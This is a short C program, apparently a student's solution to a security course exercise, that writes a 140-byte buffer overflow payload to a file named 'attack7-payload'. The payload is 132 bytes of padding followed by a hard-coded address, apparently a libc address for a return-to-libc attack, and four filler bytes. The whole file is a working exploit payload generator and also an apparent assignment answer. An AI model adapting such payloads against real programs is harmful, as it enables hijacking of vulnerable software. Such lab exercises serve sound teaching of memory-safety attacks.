#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
     /* YOUR CODE: Generate buf appropriately */
    char buf[140];
	memset(buf, 'A', 132);  
	buf[132]=0xb0;
	buf[133]=0x2d;
	buf[134]=0xe4;
	buf[135]=0xb7;
	buf[136]='R';
	buf[137]='A';
	buf[138]='F';
	buf[139]='I';	
		
    write_to_file( "attack7-payload", buf , 140 , FILE_CLEAR );
    exit(0);
}
